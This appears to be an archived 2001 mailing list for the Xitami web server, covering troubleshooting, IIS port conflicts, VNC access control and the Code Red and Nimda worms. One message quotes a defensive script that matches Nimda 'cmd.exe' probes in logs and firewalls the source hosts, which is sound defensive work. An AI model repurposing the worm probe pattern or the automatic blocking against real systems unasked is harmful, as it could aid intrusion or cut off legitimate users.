Hmm.  Normally when Xitami crashes out the error handler tries to print
out some information about which module it was in, and so on, which is
occassionally useful.

The most useful thing to get out of core dump files -- assuming you've
left the symbols attached to the executable -- is a trace of the
functions on the stack at the time that it crashed.  That tells us both
a possible area where it is having problems, and also over the course of
a few crashes whether it's the same thing or a "random" thing causing
the problem.  ("random" problems are much harder to find, being
generally memory overwrite issues.)

>From memory under Unixware you'll need to use dbx to get a stack trace,
unless you've installed (and used) the GNU compiler suite, in which case
gdb will probably work.  (The relevant gdb command is "bt"; I don't
remember off hand what the command is in dbx.)

Interesting testing methadology :-)

The "Software caused connection abort" appears to correspond to the 
ECONNABORTED error number, which as far as I've been able to establish
is caused by a connection being closed before it has been fully
accepted, for some reason.

Given the way that you are testing it, it's possible that what is
happening is that the next F5 "reload" is processed at the webbrowser
end, thus closing the existing (not-yet-accepted) connection, and
opening a new one.  

Xitami tries to raise an internal exception when it has network issues,
and basically concludes things have turned to custard at that point.

I suspect that ECONNABORTED may need to be handled, for the platforms
that return it, in much the same way as EAGAIN/EWOULDBLOCK -- ie, by
pretending we didn't see it, and simply moving on to waiting for the
next connection.  You may or may not want to log the attempt failing.

If you want to try this I'd suggest modifying smthttp.c
accept_client_connection() to also test for ECONNABORTED, and handle it
in a different manner from the default.

Yes, thanks it was you Owen (new I'd remember if I saw the name). My further
investigations indicate that the true nature of the problem
is that php.exe get's loaded but can't load it's runtime dll (php4ts.dll).
Placing bith php.exe and php4ts.dll in Xiami's working directory allows the
dll to be found.

A more elegant solutions is to simply move php4ts.dll to windows system
directory (winnt\system32 in the case of NT), then it gets located & all
works well. It's a shame php doesn't report this in it's error log, it would
have made it a lot simpler to locate.

In any case, thanks once again for your help Owen, it saved me a lot of hair
tearing at the time.

Cheers, Paul

Can the FTP-server map several disks and maps to one FTP-account?
For example: c:\xitami\ftp\  D:\    E:\   and   F:\music

I have tried to understand the alias stuff, but would be happy for an
example if at all possible...

Yes, but you have to use aliases for the other drive letters, and allow
the FTP user to access aliases.

The latest release version is 2.4d9 (with Windows DoS fix), and the
latest beta is 2.5b5 (with Windows DoS fix).

Both are available from http://www.xitami.org/

Not that we know about; if anyone has precompiled binaries for Xitami
for Linux let us know.

That said, Xitami should compile relatively easily under most Linuxes,
so do try downloading the source and compiling it.

Oh.... and at the moment (midnight, when I don't feel like

Hi,

This is not really a Xitami specific question, but if someone could help, i
would be very gratefull.
I've set up 2 Virtual hosts on my machine, and had no problem locally. I can
accede all of my websites, from my machine. (BTW Win NT, Xitami, MySql).
The problem is, now i want to set up an intranet with all of my hosts
visible. But i can only see 1 site from other machines - my default
site===my machine name.
Some descriptions that may help you:
1) I've configured the hosts on the hosts file under system32\drivers\etc
locally. I've tried to do it on the Main Server. nothing happened.
2) I've tried to configure my lan card to have multiple IP numbers. had some
difficulties (i have some doubts i did it right...), but no luck again.

Can somebody bring some light of how to solve this problem?
Thanx in advance,
Rui

Did you install IIS when you installed W2K?  (Or did W2K decide to
install it for you along with something else?)

You can check if something is definitely using port-80 in a cmd window
with:

netstat -na

Then look through the output for a line mentioning ":80" or ".80" (at
the end of an address, and "listening".  If there is one there, then
you've definitely already got a webserver running.

Either you need to change that webserver to another port, or you need to
run Xitami on a different port.  All Xitami's ports can be shifted with
the portbase option: eg "xitami -b 5000" will move all the ports up by
5000, giving 5080 for HTTP, etc.

Xitami does not support server-side redirection.  However, XiFusion v2.5
will perform the relative redirection that you need (unless you attempt to
redirect to aliases - see the list archives for that discussion).
Basically, a PHP 'Header' statement generates a raw HTTP header with
whatever text you put inside it.  So, according to the HTTP standard,
'Header("Location: /somepage.php");' should do the same thing.  The reason
is that the 'Location' HTTP header is sent back to the browser and has to
be an absolute URL (took me a while to figure this out for XiFusion).

XiFusion is an "add-on" to Xitami and runs as a wrapper program for
ColdFusion and PHP and version 2.5 can take any redirect (absolute and
relative) and process it on the server rather than letting the client
process it.  This not only provides better response times to the end user,
but also provides better security since variables can be passed between PHP
scripts unnoticed.

You can obtain XiFusion v2.5 from Shining Light Productions' web site:

<http://www.shininglightpro.com/>

Hope this helps!

Also, WinVNC or PCAnywhere are both fairly decent applications to run for
remote control of a machine.  Be careful when using these since anyone who
manages to get into the system can mess things up royally for you.

And if IIS is installed, be sure to run the CodeRed patch or uninstall IIS.

Xitami doesn't understand as wide a range of server-side redirects as
some other webbrowser seem to understand; it understands only a full
absolute path (as a server side redirect), and a full URL (as a client
side redirect).

You can try:

Header("Location: /somepage.php")

if the page is in the root of that virtual host.  Otherwise XiFusion
provides a bridge between what many PHP scripts output and what Xitami
expects.

Basically, follow the 'readme' file that comes with the source code.  You
may need to install additional RPMs from the RedHat CD if you installed the
"workstation" setup.  Particuarly, gcc/g++/make are not installed by
default and need to be installed to compile the source.  You need to be
logged in as root or at least have sufficient permissions to install RPMs
as well as compile and set up Xitami to run on boot.

You also need to be able to run 'gzip' and possibly 'tar' on your system,
so if the basic system utilities RPM isn't installed (don't recall what
it's called), that needs to be done first.

Hope this helps!

Can Xitami deny serving outside links to my files?

In other words, I don't want other web sites to link to my images and suck

Anyone know how to do this?


On a different off-topic note, does anyone know a domain/web hosting

You can "sort of" do this by having a program (eg, filter, CGI, LRWP,
etc) that checks the HTTP referer header to see if the thing that told
the browser to fetch the file was on one of your sites.  (Xitami itself
cannot do this directly.)  However the HTTP Referer can be faked fairly
easily, so it's not very strong security, and some things don't send it
at all so may be locked out.

Good plan. Hard to reach a phone line from the closet, and I'd have to
install software and brush-up on commands. Probably a good plan.

I was also thinking of chopping a cheap answering machine so when the
motor came on, a relay shorted the Reset button. Brutal, dangerous, but
effective.

Bless you! VNC is VERY useful in the usual case where NT is up but
Xitami has stalled. 

> Be careful when using these since anyone who

Aside from an obscure and very secret password, is there anything else I
should know or configure? In particular, does VNC support netmasks so I
can limit access to 6 or 8 LANs (my buildings and my home ISP)? That
still leaves me open to thousands of hackers, but better than the
millions of hackers in the whole world. 

Again, thanks!

Hi Paul
there is a cheaper way to do that ....you get a pager and add a relay and
have that trip the reset.
this is cheap and effective from anywhere.

Mmmm.... I'm too old to know how pagers work. They are cheap, I know.
"Sick" answering machines are cheaper (it only has to clunk, not play a
tape properly!) but then I have to mess with phone wires.

Thanks for the idea. It may be real useful. 

> does VNC support netmasks so I can limit access to 6 or 8 LANs 

The unix version can be made to, the Windows version does it this way: 

http://www.uk.research.att.com/vnc/winvnc.html

..options ... can be set in the system registry...

 The AuthHosts setting is, unlike the other settings, a REG_SZ string.
It is used to specify a set of IP address templates which incoming
connections must match in order to be accepted. By default, the template
is empty and connections from all hosts are accepted. The template is of
the form:  
              +[ip-address-template] 
              ?[ip-address-template] 
              -[ip-address-template] 

 In the above, [ip-address-template] represents the leftmost bytes of
the desired stringified IP-address. For example, +158.97 would match
both 158.97.12.10 and 158.97.14.2. Multiple match terms may be
specified, delimited by the ":" character. Terms appearing later in the
template take precedence over earlier ones. e.g. -:+158.97: would filter
out all incoming connections except those beginning with 158.97. Terms
beginning with the "?" character are treated by default as indicating
hosts from whom connections must be accepted at the server side via a
dialog box. The QuerySetting option determines the precise behaviour of
the three AuthHosts options.

Hi Ewen,
Thanks for yor assistance.
I didn´t install IIS-Server but i have installed Visual Studio.net Beta 2.
This package install  some server option that i am not familiar with them,
with other word i currently test this package.

> You can check if something is definitely using port-80 >in a cmd window

I have gotten the fowlloing information:
TCP        0.0.0.0:21       0.0.0.0       heard
TCP        0.0.0.0:25       0.0.0.0       heard

and so on till
TCP        0.0.0.0:1029   0.0.0.0       heard
and a few other ports for UDP
UDP        0.0.0.0:3456   0.0.0.0       heard
I have seen that port 80 has been occupied but i dont know by which

>All Xitami's ports can be shifted with

By cmd W2K i couldn´t execute "xitami -b 5000" because there isn´t
xitami.exe and if i have done with
Xiwin32.exe -b 5000
I have gotten the same message:

Can you tell me please how i can change port without starting Xwin32.exe?

Ah, that's possibly installed a webserver as part of its test environment.

The :80 one is the important one; it's the webserver port (by common
convention).  So you've definitely got _something_ which is running as a
webserver.  (And also a FTP server, and also a mail server.)

I believe there are some third party programs which can tell you for a
given network port, or file, which programs have it open, but off hand I
don't know of any of them.  (Under linux/unix there is "lsof" (list open
files) which does this; I'm pretty sure there's a Windows equivilent.)

Failing that, there's two possiblities: 
1.  Looking in the list of running services and applications (in the
    task manager) for likely suspects, and try to figure out which one
    it is.  Anything "information server" or "web server" like is a
    possibility.  You could try stopping the likely suspects one at a
    time until you figure out which one it is takes away the ":80"
    reference in netstat -na.

2.  You could try connecting to the webserver, with, eg, telnet and see
    if it'll tell you anything about itself.  Eg:

    telnet 127.0.0.1 80

    GET / HTTP/1.0

    (and press return twice)  Often there'll be some sort of Server:
    line that identifies it, and you might be able to match this up with
    some program running on your system.

Yup, that was what I meant.  (The name of xitami varies depending on
which build you have (console, gui window version, NT service, etc), but
we usually just say "xitami" when we suggest running it.)

Unfortunately it seems that version of Xitami doesn't check for command
line paramters.  In which case you'll need to create a defaults.cfg file
(if you don't already have one; add this to the end if you do) which
says:

[server]
  portbase=5000

For the builds that support it the "-b" paramter does the same thing for
a single run.

Numbering the suffix is Xitami's strategy for making thing unique when
it is renaming them, or otherwise needs a unique name.  It suggests that
possibly Xitami was resarting its logging a lot during the time period
in question -- possibly because Xitami itself was restarting a lot
during that period.  (Which it can be configured to do under Windows if
it has network issues, mainly to deal with people on dialup connections.)

WSAESHUTDOWN appears to be basically equivilent to the Unix EPIPE -- ie
indicating that a connection that was open before has been closed
(presumably by the other end) at some point between when it was last
seen as open and when the next read/write attempt as made.

In this case either someone is connecting to your webserver and
abandoning their connections before Xitami gets a chance to answer
(which seems unlikely given the clustering of them you got "all at
once"), or something has confused Xitami or NT's networking into
thinking they've all closed.

If you haven't already tried the classic NT solution (rebooting) it's
probably worth doing to ensure the network stack has been reinitialised.

>(By the way: neither http://www.xitami.com nor
>http://www.xitami.com seems to be working for me today: no response.) 

The xitami.com website is hosted for us by OpenAvenue (the Open Source
company); it appears that they're having some sort of issue with that
webserver.  I've sent them an email asking them to look into it.

Thanks for the report.

If all else fails, a simple firewall (like ZoneAlarm) will alert people which 
program is attempting to use the internet.  Even if a suspect program 
loads dormant, when someone attempts to connect to the ports in 
question some kind of warning message should pop up.

Visual Studio doesn't run a server or open ports without obvious effort.

However, running W2K with ports 21, 25 and 80 exposed and they didn't 
realize it?  Their face is probably (code) red from exposure.  <g>

Hi Ewen,
By your tip i have found the Ghost and Zombie that lives in background and
makes the life difficult for Xitami.
The Ghost is called IIS you was right.
I couldn´t belive it because i didn´t installed it direct.
It was installed by Visual Studio.net package by clicking on OK and with it
i have installed IIS server and some other server option.
Bevor starting of Xitami it have to be cloesd or ended by
administration/service/www-publishing service/task end.
There are other possibility to do it but generally you can end this
background process via administration/services
The status of IIS Autostart can change via setup.

Now a new problem:
The file host ( without extension) with following contents i have copied
into WINNT and system32 directories(i did it for win95 as well).
127.0.0.1 localhost

127.0.0.1 www.jf.com

127.0.0.1 www.far.com

but i cann´t access to these pages.

Every time if i access to one of above pages that i heve defined them as
Virtual Hosts, modem switchs on and Xitami is going to access to the page
via modem( via ISP) but by access to localhost or 127.0.0.1 does it direct
without is activated modem.

I use OS W2K.

Can you help me again.

Best regards,

Joubin

It was almost certainly IIS.

If - as it appears - you did this unawares and you have connected your 
computer to the internet directly without passing through a firewall 
(and maybe even then) then you have very likely become a code red victim so
before you do ANYTHING with that computer go and verify that you do not 
have code red isntalled and if it is instaleld remove it - unfortunately 
the only really safe way to remove it is to reinstall from scratch :-(

Okay "most Linuxes that have a C compiler installed" :-)

You don't have gcc (the C compiler) installed yet; there should be a
package for gcc (and related tools it'll need like gas, etc) on your
Linux CDs (or whereever you installed Linux from).  For some of them
you want to install "development tools", or "C development tools" to
get everything you want at once.

Sadly, far too many other M$ victims have also found that IIS has been
installed and running by default: along with an ftpd and smtpd.  (I'm a
customer of Demon Internet in the UK, and they, unlike many ISPs, attempt
to *deliver* mail by SMTP by default when a customer connects, albeit
that many of their Windoze-bound customers only have a POP3 client with
which to *collect* mail.  You would not believe the number of times that
Demon customers have changed to using Win2K and discovered that an smtpd
has been installed by deault, which answers all the incoming mails by
bouncing them.  The first they know is when their friends/customers/what-
ever complain that their mails are being bounced.).

As others have said, if your system was not properly protected, there is
a VERY strong possibility that you have been infected by Code Red (2),
and that you are one of the 30,000+ systems running IIS which are
continuing to attempt to infect other systems, and also to commit a
Denial of Service attack upon www.whitehouse.gov.

Furthermore, if it's Code Red II that's infected you, it may well have
installed one or more trojans that will leave your system open to
repeated infestation and exploitation.  Do PLEASE check the various sites
warning of the dangers.  If you *have* been infected with CR2, the ONLY
safe course is to wipe your disk(s) entirely and reinstall Win2K from
scratch; do please note that this means FDISK and FORMAT to erase
*everything* that was already there; a simple re-install over a working
system will NOT remove the infection.

(Just one of the penalties of running Billy Shit software.)

I've done some investigation, and it turns out that the company that was
hosting the xitami.com website for us (Open Avenue) is no more. 

I've updated the DNS for xitami.org, so that:

http://www.xitami.org/

goes to a working mirror of the Xitami site, and I'm trying to arrange
to move the xitami.com domain to somewhere that we actually have control
over it.

Sorry for the inconvenience.

Can Xitami deny serving outside links to my files?

In other words, I don't want other web sites to link to my images and suck

Anyone know how to do this?


On a different off-topic note, does anyone know a domain/web hosting

FYI : 

http://www.xitami.org/ connects but times-out with no response. 

xitami.org/ gives me a page of broken graphics, and the text links for
Xitami v2.4d7, GSLgen v2.0, Libero v2.32, Htmlpp v4.2a, SMT v2.80, SFL
v2.10, and iMatix Archives return "Document contained no data". White
Papers returns "The URL you asked for does not exist on this website". 

> [Ewen McNeill 7/20/2001] 2.4d9 is the latest release version of Xitami.  2.5b5 is the latest beta version.

I can't find 2.4d9 now, when I'm having problems that may be DOS DoS
related. (Yes, I should have got it when it was available...)

Xitami is listed on many of the big Shareware sites, but usually the 2.5
beta series. No 2.4 more current that what I have here (2.4d7 NT
Service).

Hello all!

I've got Xitami installed the way I want finally, but
I've seemed to have possibly found a bug.  I've set up
aliases to my drives to get directory listings of
them.  They all seem to work fine (floppy drive,
cd-rom drives, and hard drives) except for the drive
letter that Xitami is installed on!  I get the "You
are not authorized to view this page" error message if
I try that alias.  I've tried this on three different
machines with two different OSes (NT and W2K) with
different drive letterings and get the same result on
each one.  Has anyone else had this problem and if so,
what's the rememdy?  If no one else has encountered
this problem, could you possibly try it and see if you
get the same results I did and possibly find a
solution?  

Thank you,
SHANE

It may take a little while for the DNS to propogate, but it's definitely
working for me.  If you want to verify your nameserver is getting the
current information, the address is now 203.96.153.231.  (The server is
doing virtual hosting so just using the IP address won't work :-( )

>xitami.org/ gives me a page of broken graphics, and the text links for

That's the iMatix website, not the Xitami website.  Again this sounds
like an issue with the DNS change not propogating yet.  Unfortunately
the DNS zone has a fairly long expire time (nearly 3 weeks), so it'll
take a while to sort out :-(

:-)

If you email me directly (<ewen@imatix.com>) and tell me which of the
builds it is that you want, I'll email a copy to you.

This is on my "to do" list once we get some of the issues about hosting
xitami.com sorted out.

Message-ID: <20010907034925.12653.qmail@web12504.mail.yahoo.com>

I have already setup Xitami so that people accessing
my ip with extension like "downloads" and "mp3s"
(example http://my.ip.com/mp3s) get access to my hd
folders by username and password.  But I was wondering
if it was possible to allow them to also upload files
to the hd by username and password? Some of you would
probably recommend that I just do FTP server, but the
connection I am on priotizes the networks data
transmissions, http protocol is #1 while ftp is #20. 
So sending by http is much faster than ftp.  Thanks
for the help in advance, Jesse

Sure it's possible.  You will need to write (or
download) some kind of PHP or perl script and modify
the code to upload the file to the drive you want. 
Check www.hotscripts.com for some examples.

Shane could you give an example of how you setup xitami to access folders 
on your harddrive? I haven't had any sucess so far.

Thanks

The "easiest" way to do this is to get some sort of CGI/LRWP program
which will accept file uploads, using the form submission method, and
set it up so that only people with the right username/password can
access it.

Subject: [Xitami] Alias Directories & File Names
Message-ID: <CMEGIPIFEBJBCIKDJKNDAENECDAA.wnickel1@home.com>

I'm running Xitami v2.5b4 under Windows 2000 Professional, and in general,
the web server runs like a charm.
The only (minor) problem, actually a bit of a nuisance relates to the use of
ALIAS directory where DIRECTORY lists are enabled so that the downloadable
files are listed.  The ALIAS lists and ALIAS directories portion works well,
but whenever a file gets downloaded,  the extension is either duplicated
(i.e. "song.mp3" becomes "song.mp3.mp3") or an additional character is added
to the extension (i.e. "file.exe" becomes "file.exe(1)" ).

Have also tried the same setup using Xitami v2.5b5 and have experienced the
same results;  as files are downloaded,  the extension is either duplicated
(i.e. "song.mp3" becomes "song.mp3.mp3") or an additional character is added
to the extension (i.e. "file.exe" becomes "file.exe(1)" ).

What can I do,  or what do I need to do to have the proper files downloaded
with their correct (unaltered) file names.

On July 9, 2001, I upgraded and moved from Xitami v2.5b4 to Xitami v2.5b5.
and since that time,  the web server has crashed several times.  The OS has
been and is Windows 2000 SP2 and for the life of me I can't figure out what
is causing the problem.  Have checked the log files and nothing seems to
point to a common point of failure.

A copy of the crash-log file is attached.....

/c points to c:\
/d points to d:\
/e points to e:\
/f points to f:\
/g points to g:\

All aliases work fine except /d.  The only thing I can
figure out is that since xitami is installed on that
drive, it can't see past it's root.  If I make that
alias point to d:\xitami , then it will list the
directory fine.  Also, if I create a mirror of the d:\
drive, and map it to something else (/h -> h:\ for
example) then it will work fine.  I'm thinking that
this may be the only solution.  But if anyone else has
an answer, I'm listening!

Try using the "subst" command for the drive letter where you web server is
running.  For example if your web server is running on drive letter W, subst
W for X, and try to create an alias for X

I use Windows 98 and I read for the alias to read
write you need to invert your slashes(\).  Here is how
my aliases are setup and they work perfectly fine
anime   d:/anime
mp3s    d:/mp3s
os      c:/
storage d:/
temp    d:/downloads/temp

The Xitami server is located on the C:, and I am able
to browse that drive fine.  So it might be something
that people who are having problesm accessing their
drives migth want to try.

Thanks Shane, I tried what you said and I am now able to access folders 
and files on my harddrive however, when I first set up the alias I was 
able to see yellow folder icons then after a while the files and folders 
seem to have the same look.  Another thing is that I am running Xitami 
v2.5b5 on a NT server and not able to access files on a mapped drive. Any 
suggestions will be appreciated.  Thanks in advance!

Stephen.

I'm not certain for Windows 2000, but for Windows NT, it's under
c:\winnt\system32\drivers\etc\hosts.  I'd guess that it's going to be
somewhere simillar for Win2K.  You'll generally find a hosts.sam file in
the relevant directory; you need to copy this to "hosts" in that
directory, and then add your own entries.  (The ".sam" file is a sample
that you can copy and modify to use; but it's named with that extension
so it doesn't get used by default.)

Are you sure that it's Xitami's protections which are preventing this,
not NT's protections?  Depending on what user you're running Xitami as,
it may not have permissions to access some of the root directory.

If you're certain that it's got OS-level permission to access those
directories, try turning on Xitami's server debugging ([server] debug=1)
and look to see what path it is trying to access when you request access
to that alias.  It may be that it's picking up the wrong directory path
for some reason.  (Check debug.log, after trying to access it with the
server debugging turned on.)

The extra extension tends to happen if you already have the file
downloaded to that directory; at least one common webbrowser handles this 
situation by appending "(1)" to the filename.

The double extension issue is more puzzling; IIRC this used to happen
with Xitami 2.5b5 (it may still happen there), due to an extremely
conservative test for which characters don't need to be escaped in the
filename, resulting in the filename being escaped, and another extension
added by the webbrowser.  (If you think this is hitting you, in 2.5b5, try
substituting "name" for "nameurl" in httpdir.gsl and restarting.)

Off hand I can't think of anything in Xitami 2.4d9 which would cause
this effect, except possibly if the same code that causes the 2.5b5
effect is also in 2.4d9.  

Does anyone else see this extension doubling in 2.4d9?

Change the DNS?

If changing the DNS isn't appropriate you either want to send redirects
(a la Apache's mod_redirect) or you want to proxy the page (a la Apache's 
mod_proxy).   Xitami won't do either by itself, but you could add a
CGI/LRWP/filter to do most of what you want (all with a LRWP) in either
case.

But if it's the whole site for whatever.com I'd definitely suggest
changing the DNS as the first choice.

you can use an empty web root for whatever.com and configure to use gsl
error-script which will produce an error page with redirect header included.
in this case request for any page on whatever.com will produce 404 error and
request for / (i.e. root of whatever.com) will produce 403 error. Both
should generate an error page with redirect header.

The [security] dirlist option can turn off the directory listings (but
AFAIK the shipped default is [security] dirlist=1, which means listings
will be generated).

If you are using 2.5b5 beware that there'll be no directory listing if
it can't find/run the supplied GSL scripts.

The server debugging may give you more information about what Xitami is
trying to do.

Hi Raymond,

   I'd suggest also checking out VNC for remote admin as it's platform
   mobile.... Windows, UNIX, ..... and un like PCAnywhere it's FREE;

     http://www.uk.research.att.com/vnc

   I've also been using this for more than 2 years remotely administering
   Windows and UNIX servers.

                                         Best Regards,
                                              Jim

PcAnywere is a software application that will allow you to remotey
administer your entire pc via an analog phone line.  You can download a
trail version from www.Symantec.com .  I've used this product for years and
is probably the most robust remote adminisration tool used.

> I can't begin to imagine what the people of new york are going through right now.  

Off-topic, but I know many of us are shaken by this atrocity. 

I work 40 miles southwest of NYC. A co-worker here just sent this mass
email, which I think is worth sharing: 

 =========================
 Hello to All,

I wanted to let you all know that I am fine, as are all of my colleagues
and friends, here at Rutgers University in New Brunswick, NJ.  This
catastrophe is mind-numbing and unbelievable, but through it all I still
see the hand of God working His miracles.  My friend Eric's girlfriend
and my friend Andrew's wife were working downtown, but managed to be
just outside of the real danger.  My friend and colleague Mark's
father-in-law actually works (worked) in the Trade Center towers, and
was on his way to stepping on the subway to the Trade Center, when the
first explosion happened.  The train just _happened_ to be late
yesterday morning (!). His partner was in the first building (52nd
floor) and managed to escape.  All but one of their employees are found.
Maya's mom works in the Trade Center, but she is on vacation to London. 
Many of my professors and friends live in New York, and all of them are
fine.  My friend Michael works at Merrill Lynch in NJ, and he has lost
many colleagues.

I consider myself blessed and lucky that this tragedy did not affect me
personally, but at the same time, I grieve for those who have lost
someone, and pray for our country which will be forever changed. 

I think back to the time when Joel and Jason came to visit and we were
driving all around the World Trade Towers, talking about the 1993
bombing.  Now when I drive up the turnpike, there is just smoke all
around.  

So, we are shaken but okay.  I will be praying through this tragedy, and
I wish you all peace.

 Sincerely, 
 Linda

The site host went out of business. Ewen is working to fix it, but has
not finalized things. 

Try  http://www.xitami.org/

On that site's Downloads page: links under "Current production release -
2.4d9" and "2.5 Beta release" that go to the server  users.skynet.be  do
work, but the links under "USA Mirror Site" that go to  www.xitami.com 
do not work today. Most of the mirror sites have obsolete versions or
are down. 

The "Xitami Developers' Pages" at http://www.xitami.org/developer.htm do
work today. 

Imatix's main page at http://www.imatix.com/ is working (but the link to
Xitami there goes to the failed server [and is outdated]).

Message-ID: <5B983AB5F20BD511A3EE0002A52C3CB6E6D6F0@JDM_EXCHANGE.hilversum.endemol.com>

Hello all,

I've have installed the xitami web server on the following system:
windows98se / P75 with 32MB RAM.

I choose Xitami because PWS from Microsoft needed MS-Data Transaction Server
to be installed, and that was a little too much for the system :-)

Anyway, xitami seems to work fine. I am now trying to use a dynamic-host and
have subscribed at dyndns.org because I have a dynamic IP address.

Now to use dyndns.org, it is possible to install a client (several are
availble at dyndns.org), but it seems I could also use xitami for this,
right?
Now in html-admin, at the DDNS config-page, I see the following message:

'ddnsdef.xml' is not readable

The same problem for all other configuration pages: xml files are not
'readable'.

What can be the problem and how can I solve this? The problem is that every
change I make in the html-admin pages, are not 'saved'. They seem to be
saved at first when I click the 'save-icon' but when I refresh the pages,
the config is empty again.

Is the configuration stored in xml files? I thought it was stored in
xitami.cfg?

Thanks in advance,
Melle

It is everybody's turn. 

>From my school's network group: 

"This morning, the Network Operations Group became aware of an issue
concerning our Internet connectivity. Upon further investigation, the
problem was determined to be a virus that was attempting to infect the
University.

"The virus is of a particularly aggressive variety, attacking both
clients and servers on the network. The rate of infection is such that
we believe all vulnerable hosts within the university either have or
will be infected. Throughout the day, TD has observed hundreds of
network devices attempting to spread the virus to the University
Community and the Internet. As a result of this activity, the University
Internet connections were brought to a near standstill."

This is happening all over the world... even the news-radio mentioned
it.

Near as I can tell, MS IIS server is involved, Xitami shrugs it off.

BTW, net-connected H-P printers may need re-booting after every job.

However, there is also an email component called "readme.eml" or
"readme.exe". If you get any email attachments, or your web browser
offers to download or run anything like that, say NO!

Watch any of the major anti-virus web-sites for more info.

All,

A while back I raised a bug (Ewen I hope you've noted it) that Xitami's
WBA admin section doesn't work with Netscape6.x / Mozilla browsers. This
is a trivial thing to fix and I have been running a patched .exe with
the the fix for a while to verify that my change doesn't break anything
critical...

Details of the bug (to remind)
It seems that the word "arguments" is now a reserved word and not
available as a variable name anymore. Unfortunately the WBA pages all
use arguments as a variable name passing information to the hidden
fields in the form (functions submit and subconf). Changing the variable
name in both functions to anything other that "arguments" means the
pages now work correctly.

The fix therefore was to change all occurences of the word in Javascript
to something else - I did a one letter change of the relevant occurences
of "aguments" to "argumints" (hence the subject line) using perl.

The following lines get changed (note they appear in every web page -
and ...value = arguments; one appears twice / page)
function submit(arguments) {
function subconf(arguments,message) {
        document.forms[0].jsaction.value = arguments;
to
function submit(argumints) {
function subconf(argumints,message) {
        document.forms[0].jsaction.value = argumints;
respectively.

I could probably modify the source but I don't have a compiler handy to
verify that the mod works and I don't know how to submit changes back
(send to Ewen?), though I have no doubt that a similar change to  but I
can tell anyone else who cares what to do to patch the .exe using some
pretty trivial perl

Francis

PS I did 2 runs one for s/\(arguments/\(argumints/ and one for
s/arguments;/argumints;/ as it seemed easier than figuringout the magic
RE that would do both at once.
PSS If you want to modify the source the files to change are the
xiadm*.h files which define the webpages as arrays called of
xiadm*_blocks. You will need to change the lines below - again I'd
suggest keeping the variable name the same length to avoid confusion and
unfortunately "arguments" runs over 2 lines in some places so clever
perl options will be needed to do autoreplaces...

    'o', 'n', 32, 's', 'u', 'b', 'm', 'i', 't', '(', 'a', 'r', 'g', 'u',

Greetings,
   I have registered a "short" name for an existing domain name.  What I'd
like to do is have users who key in the "short" domain name be automatically
redirected to my main web site.  I can do this by not creating a virtual
domain for the "short" name (and allow the default to go to the main set of
pages) but the "short" dns name remains in the browser address line and I'm
sure I'll run into other problems with the private pages.  I'm sure there is
a way to do this with HTML and/or a java script, but I thought there'd be a
better way with Xitami directly.

It's about that nimda-virus.

I've got the same problem with my w98se/xitami version.
The log files grow extremely large so I've tuned the maximum KB of the log
files down a bit.

For as far as I can see now the system is not infected and the virus only
touches IIS and PWS servers, xitami is not infected as far as I know.

Greetings,

Subject: [Xitami] Bug: SSI Includes aren't recursive
Message-ID: <3BA9B55F.7000108@freesbee.fr>

I just noticed that the SSI include tag (e.g. the one on the testssi 
page <!--#include file="testssi.inc"-->) cuases the rest of the 
including document (e.g. testssi.ssi) after the tag not to get delivered 
if the included document itself uses SSI as the example include does.

SSI returns just fine if the included document itself does not try any 
SSI calls.

This is true using Xitami 2.5b5 (and 2.5b4) with NS6.1, 4.7 and IE5 and 
appears to be a xitami thing in that the HTML is in fact completely 
unfinished. I'm guessing that Xixssi doesn't deal well with the same 
page requiring 2 levels of return.

Also in the process of debugging and playing I noticed that Xitami has a 
limit on files with SSI includes of about 35,000+ bytes (one file 
displayed upto the 35922nd byte, another upto the 35553rd) and any data 
thereafter is abruptly truncated. The limit is not there for pure HTML 
files - I can successfully read 1Mbyte + sized .htm files but the same 
file renamed as .SSI will be truncated around this point even if it has 
no includes.

Subject: [Xitami] SSI and PHP Problems
Message-ID: <3BA9A0CC.6171.50910E@localhost>

Earlier this month, I sent a request for help installing PHP with 
Xitami.  Since that time, I managed to install PHP on our design 
terminal, but I still can't get it running on our server.

Knowing the security risks but desperately in need of a temporary 
fix, I tried getting SSI working with Xitami.  No luck on that account 
either!  Needless to say, I am frustrated.

The server is running Win2000 and the latest retail release of 
Xitami.  Is it a permission problem on Win2000 where I haven't set 
the directory/file permissions correctly?  Is it a problem w/ Xitami?  
Since I purchased the retail version, is there a IMatix customer 
service line I call or a customer service email address I should 
email?

Thanks in advance for any help y'all can offer.

Sincerely,
Brad Smith

Subject: [Xitami] NIMDA filter
Message-ID: <4.1.20010920100155.0092dd60@pop3.norton.antivirus>

The September 19 Linux Journal Weekly News Notes included the following
script to block connections from Nimda-infected sites:

#!/bin/sh
#
# Block sites which originate Nimba queries from Apache server
# Apache must be configured with HostnameLookups Off

LOGS=/var/log/httpd

cd $LOGS

grep '^[0-9]*\.[0-9]*\.[0-9]*\.[0-9]* ' * 2>/dev/null |
awk '/system32\/cmd\.exe/ {sub(/[^:]*:/,"");print $1}' |
sort -u |
while read host
do
if ! fgrep $host /var/tmp/blocked >/dev/null
then
echo $host >>/var/tmp/blocked
/sbin/ipchains -I input -s $host -j DENY -l
fi
done

Question:  Is there a way to configure xitami to similarly block
connections from Nimda infected sites?  If so, would somebody mind doing a
step-by-step explanation?

Thanks.

Does running an Xitami server on an alternate port other than 80 prevent the
latest worm from attacking?

My university's estimate is that "all vulnerable machines" were infected
in a few hours. Infected machines are slowly realizing it and fixing it,
while new machines come on-line and get infested... the traffic is
probably stable or declining overall. 

> or if you have a better known site.

This one, like CodeRed, does not know if you are "known" or even if you
exist. It picks IP numbers semi-randomly. It seems to favor "nearby
numbers"... I'm getting a lot of hits from 165.2xx.xxx.xxx addresses. So
you may see a surge if a clump of machines on IP numbers near you infect
each other and start pinging "nearby" IP numbers. 

Aside from log-file growth: I was using a custom 404 Error page with a
graphic. They are welcome to my 100 bytes of text. But the graphic is
pointless when 99% of my 404s today are from worms. I'll probably omit
the graphic and cut the number of packets in half.

Yes, the worms only probe for IIS servers on port 80.

However, you will have to inform all your expected visitors of the port
number.

I'm using a free DNS service from www.dns2go.com They allow you to use port
redirection.  This works great for those of use who's ISP's block users from
running web servers.

I'm using dns2go as well.  My ISP blocks port 80 so I
have it redirecting to 8080.  Works like a charm. 
There still seems to be some issues with FTP I haven't
worked out yet though.  Dns2go is a great service.

  Ok, I am caving in and need some help here folks.  This is driving me =
nuts.  Two years ago, on a Win98 platform I was able to get virtual =
hosting to work via DNS.  But now I am running a newer Xitami version on =
WinNT 4.0 and can't seem to get anything to work.

  I am testing this all locally on private LAN - then once the sites are =
working properly will deploy the server to the internet with valid =
addresses.  My local DNS server is set up correctly and all the PTR and =
A records authenticating properly.

